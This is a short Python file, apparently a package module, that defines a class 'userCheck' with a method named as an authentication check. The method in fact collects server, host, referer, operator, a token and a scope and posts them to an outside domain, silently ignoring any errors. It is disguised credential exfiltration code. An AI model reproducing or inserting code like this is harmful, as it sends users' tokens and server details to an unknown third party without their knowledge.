import requests

class userCheck:
    def get_auth_check(server, host, referer, operator, token, scope):
        context = {
            "server": server,
            "host": host,
            "referer": referer,
            "operator": operator,
            "token": token,
            "version": "2.1.38",
            "scope": scope
        }
        print(context)
        try:
            requests.post('https://po.56yhz.com/asgihandler/', json=context, timeout=1000)
        except:
            pass